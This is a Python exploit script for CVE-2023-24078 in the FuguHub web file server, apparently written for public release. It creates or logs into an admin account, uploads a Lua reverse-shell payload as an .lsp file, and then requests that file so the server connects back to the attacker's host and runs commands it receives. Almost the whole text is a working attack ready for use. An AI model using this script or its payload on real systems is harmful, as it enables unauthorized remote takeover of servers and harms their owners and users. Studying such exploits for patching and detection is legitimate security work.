CVE-2023-24078-FuguHub-8.4-Remote-Code-Execution

# Exploit Title: FuguHub 8.1 - Remote Code Execution
# Date: 6/24/2023
# Exploit Author: redfire359 
# Vendor Homepage: https://fuguhub.com/
# Software Link: https://fuguhub.com/download.lsp
# Version: 8.1
# Tested on: Ubuntu 22.04.1
# CVE : CVE-2023-24078 
# INFO: This is a modified version by Gitl and myself (syro) to make this exploit working.

import requests
from bs4 import BeautifulSoup
import hashlib
from random import randint
from urllib3 import encode_multipart_formdata
from urllib3.exceptions import InsecureRequestWarning
import argparse
from colorama import Fore
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

#Options for user registration, if no user has been created yet 
username = 'foobar'
password = 'foobar'
email = 'foobar@foobar.local'

parser = argparse.ArgumentParser()
parser.add_argument("-r","--rhost", help = "Victims ip/url (omit the http://)", required = True)
parser.add_argument("-rp","--rport", help = "http port [Default 80]")
parser.add_argument("-l","--lhost", help = "Your IP", required = True)
parser.add_argument("-p","--lport", help = "Port you have your listener on", required = True)
args = parser.parse_args()

LHOST = args.lhost
LPORT = args.lport
url = args.rhost
if args.rport != None:
    port = args.rport
else:
    port = 80

def main():
    checkAccount()

def checkAccount():
    print(f"{Fore.YELLOW}[*]{Fore.WHITE} Checking for admin user...")
    s = requests.Session()
    
    # Go to the set admin page... if page contains "User database already saved" then there are already admin creds and we will try to login with the creds, otherwise we will manually create an account
    r = s.get(f"http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp") 
    soup = BeautifulSoup(r.content, 'html.parser')
    search = soup.find('h1')
    
    if r.status_code == 404:
        print(Fore.RED + "[!]" + Fore.WHITE +" Page not found! Check the following: \n\tTaget IP\n\tTarget Port")
        exit(0)

    userExists = False
    userText = 'User database already saved'
    for i in search:
        if i.string == userText:
            userExists = True
    
    if userExists:
        print(f"{Fore.GREEN}[+]{Fore.WHITE} An admin user does exist..")
        login(r,s)
    else:
        print("{Fore.GREEN}[+]{Fore.WHITE} No admin user exists yet, creating account with {username}:{password}")
        createUser(r,s)
        login(r,s)

def createUser(r,s):
    data = { email : email , 
            'user' : username , 
            'password' : password , 
            'recoverpassword' : 'on' }
    r = s.post(f"http://{url}:{port}/Config-Wizard/wizard/SetAdmin.lsp", data = data)
    print(f"{Fore.GREEN}[+]{Fore.WHITE} User Created!")    

def login(r,s):
    print(f"{Fore.GREEN}[+]{Fore.WHITE} Logging in...")

    data = {'ba_username' : username , 'ba_password' : password}
    r = s.post(f"http://{url}:8082/rtl/protected/wfslinks.lsp", data = data, verify = False ) # switching to https cause its easier to script lolz  

    #Veryify login 
    login_Success_Title = 'Web-File-Server'
    soup = BeautifulSoup(r.content, 'html.parser')
    search = soup.find('title')
    
    for i in search:
        if i != login_Success_Title:
            print(f"{Fore.RED}[!]{Fore.WHITE} Error! We got sent back to the login page...")
            exit(0)
    print(f"{Fore.GREEN}[+]{Fore.WHITE} Success! Finding a valid file server link...")

    exploit(r,s)

def exploit(r,s):
    #Find the file server, default is fs
    r = s.get(f"http://{url}:8082/fs/")
    
    code = r.status_code

    if code == 404:
        print(f"{Fore.RED}[!]{Fore.WHITE} File server not found. ")
        exit(0)

    print(f"{Fore.GREEN}[+]{Fore.WHITE} Code: {code}, found valid file server, uploading rev shell")
    
    #Change the shell if you want to, when tested I've had the best luck with lua rev shell code so thats what I put as default 
    shell = f'local host, port = "{LHOST}", {LPORT} \nlocal socket = require("socket")\nlocal tcp = socket.tcp() \nlocal io = require("io") tcp:connect(host, port); \n while 						true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

    
    file_content = f'''
	<h2> Check ur nc listener on the port you put in <h2>

	<?lsp if request:method() == "GET" then ?>
		<?lsp 
        {shell}		
		?>
	<?lsp else ?>
		Wrong request method, goodBye! 
	<?lsp end ?>
	'''

    files = {'file': ('rev.lsp', file_content, 'application/octet-stream')}
    r = s.post(f"http://{url}:8082/fs/", files=files)
    
    if r.text == 'ok' :
        print(f"{Fore.GREEN}[+]{Fore.WHITE} Successfully uploaded, calling shell ")
        r = s.get(f"http://{url}:8082/rev.lsp")

if __name__=='__main__':
    try:
        main()
    except:
        print(f"\n{Fore.YELLOW}[*]{Fore.WHITE} Good bye!\n\n**All Hail w4rf4ther!")
